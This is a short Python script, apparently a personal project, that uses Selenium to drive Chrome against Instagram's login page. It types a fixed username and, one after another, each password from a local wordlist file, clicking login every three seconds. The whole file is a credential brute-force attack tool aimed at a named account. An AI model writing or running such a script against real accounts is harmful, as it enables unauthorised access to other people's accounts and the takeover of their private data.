from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep

class Instagram:
    def __init__(self, name, password, chrome_path):
        self.url = "https://www.instagram.com/"
        self.name = name
        self.password_path = password
        self.chrome_path = chrome_path
        self.browser = webdriver.Chrome(executable_path=self.chrome_path)

    def Entry(self):
        try:
            self.browser.get(self.url)

            self.nameBlock = self.browser.find_element_by_name("username")
            self.passBlock = self.browser.find_element_by_name("password")
            self.loginButton = self.browser.find_element_by_xpath("//*[@id='loginForm']/div[1]/div[3]/button")

            for password in open(self.password_path, "r"):
                self.nameBlock.send_keys(Keys.CONTROL + "a")
                self.nameBlock.send_keys(Keys.DELETE)
                self.passBlock.send_keys(Keys.CONTROL + "a")
                self.passBlock.send_keys(Keys.DELETE)
                # cleared textbox

                self.nameBlock.send_keys(self.name)

                if len(password) >= 6:
                    self.passBlock.send_keys(password)
                else:
                    print("This password is too short!\n", password)
                    continue
                # wrote name and pass

                print("Trying Password; ", password)
                self.browser.execute_script("arguments[0].click();", self.loginButton)
                sleep(3)

        except Exception as e:
            print(e)


if __name__ == "__main__":
    ins =Instagram("berat.m3rt", "E:/[Kodlama]/selenium/passwords.txt", "E:\[Kodlama]\selenium\chromedriver.exe")
    ins.Entry()